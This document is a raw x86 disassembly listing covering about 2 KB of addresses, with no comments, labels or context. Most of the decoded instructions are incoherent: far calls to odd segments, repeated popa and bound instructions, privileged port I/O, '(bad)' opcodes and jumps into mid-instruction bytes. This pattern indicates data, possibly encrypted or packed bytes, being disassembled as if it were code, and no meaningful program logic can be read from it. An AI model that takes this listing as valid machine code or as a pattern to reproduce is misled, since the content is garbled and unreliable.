  4344b8:	push   0x75216161
  4344bd:	mov    cl,0xad
  4344bf:	loop   0x4344c2
  4344c1:	imul   esp,DWORD PTR [ecx],0xe225fd75
  4344c7:	add    DWORD PTR [ecx+0xd],ebp
  4344ca:	jne    0x43447d
  4344cc:	test   DWORD PTR [ebx],ecx
  4344ce:	call   0xa8e8:0x5e343ac9
  4344d5:	popa   
  4344d6:	pop    ss
  4344d7:	jne    0x434501
  4344d9:	or     eax,0xb85b175
  4344de:	call   0xa8e8:0x5e343ac9
  4344e5:	popa   
  4344e6:	pop    ss
  4344e7:	jne    0x4344f1
  4344e9:	or     eax,0x7517fb75
  4344ee:	and    BYTE PTR [ebx],dl
  4344f0:	jne    0x4344e5
  4344f2:	pop    ss
  4344f3:	jne    0x434511
  4344f5:	or     eax,0x610d1c75
  4344fa:	or     eax,0x1faff3cd
  4344ff:	or     eax,0x68171ccd
  434504:	or     eax,0x610d1c75
  434509:	xor    edx,edx
  43450b:	sar    BYTE PTR [edi+0x1ccd0d3a],1
  434511:	pop    ss
  434512:	push   0x175d7513
  434517:	jne    0x43456d
  434519:	or     eax,0x610d5475
  43451e:	or     eax,0x1faf5dcd
  434523:	or     eax,0x681754cd
  434528:	or     eax,0x610d5475
  43452d:	xor    edx,DWORD PTR [edx+0xd3abfe1]
  434533:	int    0x54
  434535:	pop    ss
  434536:	push   0x17ad7513
  43453b:	jne    0x434536
  43453d:	or     eax,0x610df975
  434542:	or     eax,0x1fafadcd
  434547:	or     eax,0x6817f9cd
  43454c:	or     eax,0x610df975
  434551:	xor    ebp,DWORD PTR [ecx+eiz*8]
  434554:	mov    edi,0xf9cd0d3a
  434559:	pop    ss
  43455a:	push   0x17507513
  43455f:	jne    0x434575
  434561:	or     eax,0x610d1475
  434566:	or     eax,0x1faf50cd
  43456b:	or     eax,0x681714cd
  434570:	or     eax,0x610d1475
  434575:	xor    edx,edx
  434577:	addr16 inc eax
  434579:	cmp    cl,BYTE PTR ds:0x681714cd
  43457f:	and    DWORD PTR [ebp+0x55],esi
  434582:	ret    0x1fa
  434585:	imul   ebx,eax,0xe7619aea
  43458b:	cmp    al,bl
  43458d:	jmp    0xead8:0x78e76186
  434594:	mov    ah,BYTE PTR [ecx-0x19]
  434597:	jbe    0x4345a6
  434599:	jne    0x434535
  43459b:	xchg   ebx,eax
  43459c:	repnz popa 
  43459e:	or     eax,0x6fd655cd
  4345a3:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4345a9:	pop    esi
  4345aa:	call   0xf2d6a757
  4345af:	push   edi
  4345b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4345b1:	pop    ds
  4345b2:	out    0x3a,eax
  4345b4:	scas   eax,DWORD PTR es:[edi]
  4345b5:	sbb    al,0xf0
  4345b7:	ins    BYTE PTR es:[edi],dx
  4345b8:	xchg   ecx,eax
  4345b9:	popa   
  4345ba:	popa   
  4345bb:	or     eax,0xb85b175
  4345c0:	call   0xa8e8:0x5e343ac9
  4345c7:	popa   
  4345c8:	pop    ss
  4345c9:	jne    0x434607
  4345cb:	or     eax,0xb85b175
  4345d0:	call   0xa8e8:0x5e343ac9
  4345d7:	popa   
  4345d8:	pop    ss
  4345d9:	jne    0x434623
  4345db:	or     eax,0xcd0d9a75
  4345e0:	call   0x4ccd:0x1796da56
  4345e7:	or     eax,0xa20d4c75
  4345ec:	rcl    BYTE PTR [edi],cl
  4345ee:	jne    0x434638
  4345f0:	fsubr  st,st(2)
  4345f2:	dec    eax
  4345f3:	popa   
  4345f4:	mov    dl,0x3a
  4345f6:	scas   eax,DWORD PTR es:[edi]
  4345f7:	sbb    al,0xf0
  4345f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345fa:	xchg   ecx,eax
  4345fb:	popa   
  4345fc:	popa   
  4345fd:	and    DWORD PTR [ebp+0x58],esi
  434600:	lods   eax,DWORD PTR ds:[esi]
  434601:	loop   0x434613
  434603:	imul   edx,DWORD PTR [ebx],0x75175875
  434609:	and    al,0xd
  43460b:	jne    0x434665
  43460d:	test   DWORD PTR [ebx],ecx
  43460f:	call   0xa8e8:0x5e343ac9
  434616:	popa   
  434617:	or     eax,0x681724cd
  43461c:	or     eax,0xb85b175
  434621:	call   0xa8e8:0x5e343ac9
  434628:	popa   
  434629:	pop    ss
  43462a:	jne    0x434644
  43462c:	or     eax,0xdb0d2075
  434631:	or     al,0x68
  434633:	popa   
  434634:	popa   
  434635:	or     eax,0x170d20cd
  43463a:	or     al,0x68
  43463c:	popa   
  43463d:	popa   
  43463e:	or     eax,0x56610d91
  434643:	cdq    
  434644:	xchg   esi,eax
  434645:	pop    ss
  434646:	jne    0x4346a8
  434648:	or     eax,0xf2936075
  43464d:	mov    ds:0x60cd0d7e,al
  434652:	adc    ebp,DWORD PTR [eax+ebp*2]
  434655:	mov    dl,BYTE PTR [edi]
  434657:	jne    0x4346c2
  434659:	or     eax,0xb85b175
  43465e:	call   0xa8e8:0x5e343ac9
  434665:	popa   
  434666:	pop    ss
  434667:	jne    0x4346cd
  434669:	or     eax,0xdb0d2075
  43466e:	adc    BYTE PTR [eax+0x61],ch
  434671:	popa   
  434672:	or     eax,0x18751761
  434677:	or     eax,0xdb0d2075
  43467c:	adc    BYTE PTR [eax+0x61],ch
  43467f:	popa   
  434680:	or     eax,0x9aa718cd
  434685:	mov    dl,0x9f
  434687:	adc    esi,DWORD PTR [ebp+0x28]
  43468a:	ror    BYTE PTR ds:0xb855d75,cl
  434690:	call   0xa8e8:0x5e343ac9
  434697:	popa   
  434698:	ror    BYTE PTR ds:0xeb626075,cl
  43469e:	shl    BYTE PTR [edx-0x4e],cl
  4346a1:	sbb    BYTE PTR ds:0xdb0d2075,cl
  4346a7:	dec    eax
  4346a8:	push   0xd2626161
  4346ad:	jbe    0x4346bc
  4346af:	jne    0x434711
  4346b1:	or     eax,0xa20d60cd
  4346b6:	shr    BYTE PTR ds:0xdd2be99,cl
  4346bc:	jne    0x43471e
  4346be:	or     eax,0xda5618cd
  4346c3:	mov    esi,0x934bf3c9
  4346c8:	popa   
  4346c9:	popa   
  4346ca:	or     eax,0xdb0d2075
  4346cf:	jmp    0xda4a83c
  4346d4:	int    0x18
  4346d6:	pop    ss
  4346d7:	call   0xbeeb:0x624c750d
  4346de:	bound  esi,QWORD PTR [edx+0x18b2629a]
  4346e4:	repz fisttp QWORD PTR [ecx+eiz*2+0x18750d61]
  4346ec:	or     eax,0xda5618cd
  4346f1:	xchg   esi,eax
  4346f2:	pop    ss
  4346f3:	int    0x4c
  4346f5:	or     eax,0xf2934c75
  4346fa:	mov    ds:0x4ccd0d7e,al
  4346ff:	adc    ebp,DWORD PTR [eax+ebp*2]
  434702:	mov    dl,BYTE PTR [edi]
  434704:	jne    0x434737
  434706:	or     eax,0xf2934c75
  43470b:	mov    ds:0xb1cd0d3b,al
  434710:	(bad)  
  434711:	outs   dx,DWORD PTR ds:[esi]
  434712:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434718:	pop    esi
  434719:	call   0x1feaa8c6
  43471e:	xchg   ebx,eax
  43471f:	outs   dx,BYTE PTR ds:[esi]
  434720:	cmp    al,0x61
  434722:	popa   
  434723:	popa   
  434724:	or     eax,0xb85b175
  434729:	call   0xa8e8:0x5e343ac9
  434730:	popa   
  434731:	pop    ss
  434732:	jne    0x434735
  434734:	out    dx,al
  434735:	jl     0x434744
  434737:	jne    0x434736
  434739:	test   DWORD PTR [ebx],ecx
  43473b:	call   0x1301:0xcd0d3ac9
  434742:	outs   dx,BYTE PTR ds:[esi]
  434743:	push   0x61a8e85e
  434748:	pop    ss
  434749:	jne    0x43474c
  43474b:	or     eax,0x1cd83175
  434750:	cmp    BYTE PTR [edi],dl
  434752:	jne    0x434785
  434754:	or     eax,0xf2934c75
  434759:	mov    ds:0xfdcd0d3b,al
  43475e:	(bad)  
  43475f:	outs   dx,DWORD PTR ds:[esi]
  434760:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434766:	pop    esi
  434767:	call   0x1f70a914
  43476c:	mov    eax,ds:0xb4930175
  434771:	or     eax,0xd616161
  434776:	jne    0x4347c4
  434778:	or     eax,0xddaaaa2
  43477d:	int    0x31
  43477f:	jg     0x43471a
  434781:	call   0xd4c:0x750d7de7
  434788:	mov    ds:0x584adaaa,al
  43478d:	or     eax,0x997f31cd
  434792:	call   0xaa99:0x564ccd0d
  434799:	pop    ss
  43479a:	loop   0x434722
  43479c:	arpl   WORD PTR [edx+0x62],sp
  43479f:	out    dx,al
  4347a0:	xchg   BYTE PTR ds:0xa20d3175,cl
  4347a6:	call   0x6262:0x6386e217
  4347ad:	bound  ecx,QWORD PTR [ebx]
  4347af:	xchg   BYTE PTR [ebx+0x62],ah
  4347b2:	bound  ecx,QWORD PTR ds:0xcd0d3175
  4347b8:	sbb    BYTE PTR [esi-0x26],dl
  4347bb:	xchg   cl,cl
  4347bd:	repz arpl WORD PTR [ecx+eiz*2-0x4e8af29f],cx
  4347c5:	test   DWORD PTR [ebx],ecx
  4347c7:	call   0xa8e8:0x5e343ac9
  4347ce:	popa   
  4347cf:	or     eax,0x99a131cd
  4347d4:	xchg   edx,eax
  4347d5:	mov    dl,0x34
  4347d7:	lock shl BYTE PTR [edx+0x62],0x62
  4347dc:	or     eax,0xeb623175
  4347e1:	xchg   edx,eax
  4347e2:	or     eax,0xcd0d3175
  4347e7:	call   0x750d:0xc97eda56
  4347ee:	xor    DWORD PTR ds:0xda5618cd,ecx
  4347f4:	xchg   cl,cl
  4347f6:	repz out 0x8d,al
  4347f9:	popa   
  4347fa:	popa   
  4347fb:	lock test BYTE PTR [edx+0x62],ah
  4347ff:	bound  ecx,QWORD PTR ds:0xdb0d2075
  434805:	adc    BYTE PTR [eax+0x61],ch
  434808:	popa   
  434809:	or     eax,0x9aa718cd
  43480e:	mov    dl,0x85
  434810:	adc    esi,DWORD PTR [ebp+0x28]
  434813:	ror    BYTE PTR ds:0xb85ad75,cl
  434819:	call   0xa8e8:0x5e343ac9
  434820:	popa   
  434821:	ror    BYTE PTR ds:0xeb626075,cl
  434827:	mov    esi,0xd18b262
  43482c:	jne    0x43484e
  43482e:	or     eax,0x616848db
  434833:	popa   
  434834:	(bad)
  434839:	mov    dl,0x90
  43483b:	lock cmp al,0x3b
  43483e:	popa   
  43483f:	popa   
  434840:	lock push ecx
  434842:	cmp    esp,DWORD PTR [ecx+0x61]
  434845:	or     eax,0xdb0d2075
  43484a:	pusha  
  43484b:	push   0x610d6161
  434850:	test   DWORD PTR [ebx],ecx
  434852:	call   0xa8e8:0x5e343ac9
  434859:	popa   
  43485a:	xchg   ebx,eax
  43485b:	outs   dx,BYTE PTR ds:[esi]
  43485c:	gs pop edi
  43485e:	popa   
  43485f:	popa   
  434860:	adc    esp,edx
  434862:	imul   esp,DWORD PTR [ebx+0x62],0x55e21762
  434869:	arpl   WORD PTR [edx+0x62],sp
  43486c:	or     eax,0xb85b175
  434871:	call   0xa8e8:0x5e343ac9
  434878:	popa   
  434879:	or     eax,0x62635513
  43487e:	bound  edx,QWORD PTR [edi]
  434880:	push   0x629ae221
  434885:	bound  esp,QWORD PTR [edx-0x1]
  434888:	loop   0x43488b
  43488a:	imul   esp,DWORD PTR [ecx],0x626286e2
  434890:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434894:	imul   esp,DWORD PTR [ecx],0x626292e2
  43489a:	bound  edi,QWORD PTR [edx+eiz*8]
  43489d:	add    DWORD PTR [ecx+0x21],ebp
  4348a0:	loop   0x434920
  4348a2:	bound  esp,QWORD PTR [edx+0x62]
  4348a5:	stc    
  4348a6:	loop   0x4348a9
  4348a8:	imul   esp,DWORD PTR [ecx],0x62628ae2
  4348ae:	(bad)  
  4348af:	stc    
  4348b0:	loop   0x4348b3
  4348b2:	imul   esp,DWORD PTR [ecx],0x626276e2
  4348b8:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4348be:	pop    ebx
  4348bf:	dec    eax
  4348c0:	arpl   WORD PTR [edx+0x62],sp
  4348c3:	popa   
  4348c4:	out    dx,al
  4348c5:	lea    ecx,ds:0x626348e2
  4348cb:	bound  esp,QWORD PTR [edx+0x6348e217]
  4348d1:	bound  esp,QWORD PTR [edx-0x28]
  4348d4:	and    ecx,DWORD PTR [eax+0x63]
  4348d7:	bound  esp,QWORD PTR [edx+0x3b]
  4348da:	jae    0x4348de
  4348dc:	or     eax,0x626348e2
  4348e1:	bound  ecx,QWORD PTR ds:0x629ae26e
  4348e7:	bound  esp,QWORD PTR [edx-0x7b]
  4348ea:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4348f0:	call   0x1350aa9d
  4348f5:	dec    eax
  4348f6:	arpl   WORD PTR [edx+0x62],sp
  4348f9:	xchg   esp,eax
  4348fa:	pop    ss
  4348fb:	outs   dx,BYTE PTR ds:[esi]
  4348fc:	int    0x64
  4348fe:	arpl   WORD PTR [edx+0x62],sp
  434901:	out    dx,al
  434902:	adc    eax,0x62fbe221
  434907:	bound  esp,QWORD PTR [edx+0x18]
  43490a:	loop   0x43490d
  43490c:	imul   esp,DWORD PTR [ecx],0x62628ee2
  434912:	bound  edi,QWORD PTR [edx+eiz*8]
  434915:	add    DWORD PTR [ecx+0x21],ebp
  434918:	loop   0x434952
  43491a:	bound  esp,QWORD PTR [edx+0x62]
  43491d:	and    ah,dl
  43491f:	add    DWORD PTR [ecx+0x21],ebp
  434922:	loop   0x4348ca
  434924:	bound  esp,QWORD PTR [edx+0x62]
  434927:	arpl   dx,sp
  434929:	add    DWORD PTR [ecx+0x21],ebp
  43492c:	loop   0x4349a0
  43492e:	bound  esp,QWORD PTR [edx+0x62]
  434931:	cmp    eax,0x216901e2
  434936:	loop   0x4348d6
  434938:	bound  esp,QWORD PTR [edx+0x62]
  43493b:	jmp    edx
  43493d:	add    DWORD PTR [ecx+0x21],ebp
  434940:	loop   0x4348ec
  434942:	bound  esp,QWORD PTR [edx+0x62]
  434945:	cmp    al,0xe2
  434947:	add    DWORD PTR [ecx+0x21],ebp
  43494a:	loop   0x4348e2
  43494c:	bound  esp,QWORD PTR [edx+0x62]
  43494f:	(bad)  
  434951:	add    DWORD PTR [ecx+0x21],ebp
  434954:	loop   0x4348f8
  434956:	bound  esp,QWORD PTR [edx+0x62]
  434959:	jmp    edx
  43495b:	add    DWORD PTR [ecx+0x21],ebp
  43495e:	loop   0x43498c
  434960:	bound  esp,QWORD PTR [edx+0x62]
  434963:	dec    esp
  434964:	loop   0x434967
  434966:	imul   esp,DWORD PTR [ecx],0x6262dae2
  43496c:	bound  esp,QWORD PTR [edx]
  43496e:	loop   0x434971
  434970:	imul   esp,DWORD PTR [ecx],0x6262c6e2
  434976:	bound  ecx,QWORD PTR [ebp-0x1e]
  434979:	add    DWORD PTR [ecx+0x21],ebp
  43497c:	loop   0x434950
  43497e:	bound  esp,QWORD PTR [edx+0x62]
  434981:	arpl   dx,sp
  434983:	add    DWORD PTR [ecx+0x21],ebp
  434986:	loop   0x434946
  434988:	bound  esp,QWORD PTR [edx+0x62]
  43498b:	pop    ds
  43498c:	loop   0x43498f
  43498e:	imul   esp,DWORD PTR [ecx],0x6262cae2
  434994:	bound  esp,QWORD PTR [edx]
  434996:	loop   0x434999
  434998:	imul   esp,DWORD PTR [ecx],0x6262b6e2
  43499e:	bound  esp,QWORD PTR [ebp-0x1e]
  4349a1:	add    DWORD PTR [ecx+0x21],ebp
  4349a4:	loop   0x4349e6
  4349a6:	bound  esp,QWORD PTR [edx+0x62]
  4349a9:	cmp    al,0xe2
  4349ab:	add    DWORD PTR [ecx+0x21],ebp
  4349ae:	loop   0x43497e
  4349b0:	bound  esp,QWORD PTR [edx+0x62]
  4349b3:	cmp    al,0xe2
  4349b5:	add    DWORD PTR [ecx+0x21],ebp
  4349b8:	loop   0x434a34
  4349ba:	bound  esp,QWORD PTR [edx+0x62]
  4349bd:	and    ah,dl
  4349bf:	add    DWORD PTR [ecx+0x21],ebp
  4349c2:	loop   0x4349aa
  4349c4:	bound  esp,QWORD PTR [edx+0x62]
  4349c7:	dec    ecx
  4349c8:	loop   0x4349cb
  4349ca:	imul   esp,DWORD PTR [ecx],0x6262ebe2
  4349d0:	bound  edx,QWORD PTR [ebx-0x1e]
  4349d3:	add    DWORD PTR [ecx+0x21],ebp
  4349d6:	loop   0x4349bf
  4349d8:	bound  esp,QWORD PTR [edx+0x62]
  4349db:	push   ebx
  4349dc:	loop   0x4349df
  4349de:	imul   esp,DWORD PTR [ecx],0x6262e3e2
  4349e4:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  4349ea:	pop    ebx
  4349eb:	cmp    al,0x63
  4349ed:	bound  esp,QWORD PTR [edx+0x61]
  4349f0:	out    dx,al
  4349f1:	lea    ecx,ds:0x62633ce2
  4349f7:	bound  esp,QWORD PTR [edx+0x633ce217]
  4349fd:	bound  esp,QWORD PTR [edx-0x28]
  434a00:	and    edi,DWORD PTR [ebx+eiz*2]
  434a03:	bound  esp,QWORD PTR [edx-0x75]
  434a06:	jae    0x434a87
  434a08:	or     eax,0x62633ce2
  434a0d:	bound  ecx,QWORD PTR ds:0x62fbe26e
  434a13:	bound  esp,QWORD PTR [edx-0x7b]
  434a16:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434a1c:	call   0x1350abc9
  434a21:	cmp    al,0x63
  434a23:	bound  esp,QWORD PTR [edx+0x4]
  434a26:	sub    al,0x8d
  434a28:	fucomi st,st(6)
  434a2a:	and    DWORD PTR [ebx],edx
  434a2c:	loop   0x434a92
  434a2e:	arpl   WORD PTR [edx+0x62],sp
  434a31:	ror    BYTE PTR ds:0xdb0d2075,cl
  434a37:	dec    eax
  434a38:	push   0xd2626161
  434a3d:	not    DWORD PTR [edi]
  434a3f:	loop   0x434aa2
  434a41:	bound  esp,QWORD PTR [edx+0x62]
  434a44:	adc    esi,DWORD PTR [ebp-0xb]
  434a47:	pop    ss
  434a48:	loop   0x434a41
  434a4a:	bound  esp,QWORD PTR [edx+0x62]
  434a4d:	adc    esi,DWORD PTR [ebp-0x25]
  434a50:	shl    BYTE PTR [edx+0xb],cl
  434a53:	popa   
  434a54:	bound  esp,QWORD PTR [edx+0x62]
  434a57:	or     eax,0xdb0d2075
  434a5c:	dec    eax
  434a5d:	push   0xd2626161
  434a62:	call   0x6262:0x62f7130d
  434a69:	pop    ss
  434a6a:	push   0x6369e213
  434a6f:	bound  esp,QWORD PTR [edx-0x2e]
  434a72:	or     eax,0xdb0d2075
  434a77:	adc    BYTE PTR [eax+0x61],ch
  434a7a:	popa   
  434a7b:	bound  esi,QWORD PTR [edx+0xd]
  434a7e:	jne    0x434a75
  434a80:	bound  ebx,QWORD PTR [eax+0x13]
  434a83:	loop   0x434a9d
  434a85:	arpl   WORD PTR [edx+0x62],sp
  434a88:	pop    ss
  434a89:	loop   0x434a7e
  434a8b:	arpl   WORD PTR [edx+0x62],sp
  434a8e:	or     eax,0xb85b175
  434a93:	call   0xa8e8:0x5e343ac9
  434a9a:	popa   
  434a9b:	or     eax,0x6263f313
  434aa0:	bound  edx,QWORD PTR [edi]
  434aa2:	push   0x85b1750d
  434aa7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434aad:	call   0xe2e4ac5a
  434ab2:	imul   esp,DWORD PTR [ebx+0x62],0x116e9362
  434ab9:	popa   
  434aba:	popa   
  434abb:	popa   
  434abc:	adc    esp,edx
  434abe:	push   eax
  434abf:	arpl   WORD PTR [edx+0x62],sp
  434ac2:	pop    ss
  434ac3:	loop   0x434aed
  434ac5:	arpl   WORD PTR [edx+0x62],sp
  434ac8:	or     eax,0x626328e2
  434acd:	bound  ecx,QWORD PTR ds:0x62636913
  434ad3:	bound  edx,QWORD PTR [edi]
  434ad5:	call   0x10db:0xd20750d
  434adc:	push   0x130d6161
  434ae1:	imul   esp,DWORD PTR [ebx+0x62],0x8ad10d62
  434ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ae9:	call   0x6355:0xe20d78e7
  434af0:	bound  esp,QWORD PTR [edx+0xd]
  434af3:	adc    ebp,DWORD PTR [ecx+0x63]
  434af6:	bound  esp,QWORD PTR [edx+0xd]
  434af9:	xchg   ecx,eax
  434afa:	pop    ss
  434afb:	call   0x6262:0x6350e20d
  434b02:	mov    eax,ds:0x626369e2
  434b07:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434b0d:	pusha  
  434b0e:	or     eax,0xdb0d2075
  434b13:	adc    BYTE PTR [eax+0x61],ch
  434b16:	popa   
  434b17:	or     eax,0x62636913
  434b1c:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434b22:	mov    dl,0x39
  434b24:	or     eax,0xdb0d2075
  434b29:	or     al,0x68
  434b2b:	popa   
  434b2c:	popa   
  434b2d:	or     eax,0x60cd0d61
  434b32:	push   esi
  434b33:	cdq    
  434b34:	cmp    BYTE PTR ds:0x62636913,cl
  434b3a:	bound  edx,QWORD PTR [edi]
  434b3c:	cdq    
  434b3d:	jbe    0x434b4c
  434b3f:	jne    0x434b3e
  434b41:	test   DWORD PTR [ebx],ecx
  434b43:	call   0xa8e8:0x5e343ac9
  434b4a:	popa   
  434b4b:	or     eax,0x6263f313
  434b50:	bound  edx,QWORD PTR [edi]
  434b52:	push   0x6e931caf
  434b57:	or     al,0x5f
  434b59:	popa   
  434b5a:	popa   
  434b5b:	fcomp  DWORD PTR [ebx-0x56]
  434b5e:	arpl   WORD PTR [edx+0x62],sp
  434b61:	popa   
  434b62:	and    edx,esp
  434b64:	mov    ds:0xff626263,al
  434b69:	loop   0x434b6c
  434b6b:	imul   esp,DWORD PTR [ecx],0x62632ce2
  434b71:	bound  ecx,QWORD PTR [edx+eiz*8+0x1]
  434b75:	imul   esp,DWORD PTR [ecx],0x6263dae2
  434b7b:	bound  edi,QWORD PTR [edx+eiz*8]
  434b7e:	add    DWORD PTR [ecx+0x21],ebp
  434b81:	loop   0x434b49
  434b83:	arpl   WORD PTR [edx+0x62],sp
  434b86:	stc    
  434b87:	loop   0x434b8a
  434b89:	imul   esp,DWORD PTR [ecx],0x6263d2e2
  434b8f:	(bad)  
  434b90:	stc    
  434b91:	loop   0x434b94
  434b93:	imul   esp,DWORD PTR [ecx],0x6263bee2
  434b99:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434b9f:	pop    ebx
  434ba0:	mov    fs,WORD PTR [ebx+0x62]
  434ba3:	bound  esp,QWORD PTR [ecx-0x12]
  434ba6:	lea    ecx,ds:0x62638ee2
  434bac:	bound  esp,QWORD PTR [edx+0x638ee217]
  434bb2:	bound  esp,QWORD PTR [edx-0x28]
  434bb5:	and    ecx,DWORD PTR [esi+0x3b626263]
  434bbb:	jae    0x434bbf
  434bbd:	or     eax,0x62638ee2
  434bc2:	bound  ecx,QWORD PTR ds:0x63a2e26e
  434bc8:	bound  esp,QWORD PTR [edx-0x7b]
  434bcb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434bd1:	call   0x1350ad7e
  434bd6:	mov    fs,WORD PTR [ebx+0x62]
  434bd9:	bound  edx,QWORD PTR [edi+edx*1+0x63a6cd6e]
  434be0:	bound  esp,QWORD PTR [edx-0x12]
  434be3:	adc    eax,0x63cae221
  434be8:	bound  esp,QWORD PTR [edx+0x18]
  434beb:	loop   0x434bee
  434bed:	imul   esp,DWORD PTR [ecx],0x6263b6e2
  434bf3:	bound  edi,QWORD PTR [edx+eiz*8]
  434bf6:	add    DWORD PTR [ecx+0x21],ebp
  434bf9:	loop   0x434c3b
  434bfb:	arpl   WORD PTR [edx+0x62],sp
  434bfe:	and    ah,dl
  434c00:	add    DWORD PTR [ecx+0x21],ebp
  434c03:	loop   0x434bd3
  434c05:	arpl   WORD PTR [edx+0x62],sp
  434c08:	arpl   dx,sp
  434c0a:	add    DWORD PTR [ecx+0x21],ebp
  434c0d:	loop   0x434c89
  434c0f:	arpl   WORD PTR [edx+0x62],sp
  434c12:	cmp    eax,0x216901e2
  434c17:	loop   0x434bff
  434c19:	arpl   WORD PTR [edx+0x62],sp
  434c1c:	jmp    edx
  434c1e:	add    DWORD PTR [ecx+0x21],ebp
  434c21:	loop   0x434c0e
  434c23:	arpl   WORD PTR [edx+0x62],sp
  434c26:	cmp    al,0xe2
  434c28:	add    DWORD PTR [ecx+0x21],ebp
  434c2b:	loop   0x434c14
  434c2d:	arpl   WORD PTR [edx+0x62],sp
  434c30:	(bad)  
  434c32:	add    DWORD PTR [ecx+0x21],ebp
  434c35:	loop   0x434c1a
  434c37:	arpl   WORD PTR [edx+0x62],sp
  434c3a:	jmp    edx
  434c3c:	add    DWORD PTR [ecx+0x21],ebp
  434c3f:	loop   0x434c20
  434c41:	arpl   WORD PTR [edx+0x62],sp
  434c44:	dec    esp
  434c45:	loop   0x434c48
  434c47:	imul   esp,DWORD PTR [ecx],0x6263dbe2
  434c4d:	bound  esp,QWORD PTR [edx]
  434c4f:	loop   0x434c52
  434c51:	imul   esp,DWORD PTR [ecx],0x62636ee2
  434c57:	bound  ecx,QWORD PTR [ebp-0x1e]
  434c5a:	add    DWORD PTR [ecx+0x21],ebp
  434c5d:	loop   0x434c63
  434c5f:	arpl   WORD PTR [edx+0x62],sp
  434c62:	arpl   dx,sp
  434c64:	add    DWORD PTR [ecx+0x21],ebp
  434c67:	loop   0x434c79
  434c69:	arpl   WORD PTR [edx+0x62],sp
  434c6c:	pop    ds
  434c6d:	loop   0x434c70
  434c6f:	imul   esp,DWORD PTR [ecx],0x62630ce2
  434c75:	bound  esp,QWORD PTR [edx]
  434c77:	loop   0x434c7a
  434c79:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  434c7f:	bound  esp,QWORD PTR [ebp-0x1e]
  434c82:	add    DWORD PTR [ecx+0x21],ebp
  434c85:	loop   0x434c7c
  434c87:	arpl   WORD PTR [edx+0x62],sp
  434c8a:	cmp    al,0xe2
  434c8c:	add    DWORD PTR [ecx+0x21],ebp
  434c8f:	loop   0x434c92
  434c91:	arpl   WORD PTR [edx+0x62],sp
  434c94:	cmp    al,0xe2
  434c96:	add    DWORD PTR [ecx+0x21],ebp
  434c99:	loop   0x434c98
  434c9b:	arpl   WORD PTR [edx+0x62],sp
  434c9e:	and    ah,dl
  434ca0:	add    DWORD PTR [ecx+0x21],ebp
  434ca3:	loop   0x434cf9
  434ca5:	arpl   WORD PTR [edx+0x62],sp
  434ca8:	dec    ecx
  434ca9:	loop   0x434cac
  434cab:	imul   esp,DWORD PTR [ecx],0x626324e2
  434cb1:	bound  edx,QWORD PTR [ebx-0x1e]
  434cb4:	add    DWORD PTR [ecx+0x21],ebp
  434cb7:	loop   0x434c6a
  434cb9:	arpl   WORD PTR [edx+0x62],sp
  434cbc:	push   ebx
  434cbd:	loop   0x434cc0
  434cbf:	imul   esp,DWORD PTR [ecx],0x6263ade2
  434cc5:	bound  ebp,QWORD PTR [ebp-0x2796fe1e]
  434ccb:	pop    ebx
  434ccc:	sti    
  434ccd:	arpl   WORD PTR [edx+0x62],sp
  434cd0:	popa   
  434cd1:	out    dx,al
  434cd2:	lea    ecx,ds:0x6263fbe2
  434cd8:	bound  esp,QWORD PTR [edx+0x63fbe217]
  434cde:	bound  esp,QWORD PTR [edx-0x28]
  434ce1:	and    edi,ebx
  434ce3:	arpl   WORD PTR [edx+0x62],sp
  434ce6:	mov    esi,DWORD PTR [ebx-0x2c]
  434ce9:	or     eax,0x6263fbe2
  434cee:	bound  ecx,QWORD PTR ds:0x63cae26e
  434cf4:	bound  esp,QWORD PTR [edx-0x7b]
  434cf7:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  434cfd:	call   0x1350aeaa
  434d02:	sti    
  434d03:	arpl   WORD PTR [edx+0x62],sp
  434d06:	add    al,0x6e
  434d08:	lea    edx,[ebx+eiz*2]
  434d0b:	bound  esp,QWORD PTR [edx-0x12]
  434d0e:	stc    
  434d0f:	adc    esp,edx
  434d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434d12:	arpl   WORD PTR [edx+0x62],sp
  434d15:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d1b:	dec    eax
  434d1c:	push   0xd2626161
  434d21:	not    DWORD PTR [edi]
  434d23:	loop   0x434cbb
  434d25:	arpl   WORD PTR [edx+0x62],sp
  434d28:	adc    esp,edx
  434d2a:	adc    al,0x63
  434d2c:	bound  esp,QWORD PTR [edx-0x2e]
  434d2f:	bound  ecx,QWORD PTR [ebx]
  434d31:	xchg   esi,eax
  434d32:	arpl   WORD PTR [edx+0x62],sp
  434d35:	or     eax,0xdb0d2075
  434d3a:	dec    eax
  434d3b:	push   0xd2626161
  434d40:	call   0x6262:0x6358e217
  434d47:	adc    esp,edx
  434d49:	stos   BYTE PTR es:[edi],al
  434d4a:	arpl   WORD PTR [edx+0x62],sp
  434d4d:	ror    BYTE PTR ds:0xdb0d2075,cl
  434d53:	adc    BYTE PTR [eax+0x61],ch
  434d56:	popa   
  434d57:	bound  esi,QWORD PTR [edx+0x62]
  434d5a:	in     al,0x58
  434d5c:	arpl   WORD PTR [edx+0x62],sp
  434d5f:	fcomp  DWORD PTR [ebx+0x38]
  434d62:	arpl   WORD PTR [edx+0x62],sp
  434d65:	popa   
  434d66:	fsub   DWORD PTR [ebx]
  434d68:	stos   BYTE PTR es:[edi],al
  434d69:	arpl   WORD PTR [edx+0x62],sp
  434d6c:	popa   
  434d6d:	out    0xdf,eax
  434d6f:	or     eax,0x6263aae2
  434d74:	bound  edx,QWORD PTR [edi]
  434d76:	loop   0x434dee
  434d78:	arpl   WORD PTR [edx+0x62],sp
  434d7b:	or     eax,0xdb0d2075
  434d80:	adc    BYTE PTR [eax+0x61],ch
  434d83:	popa   
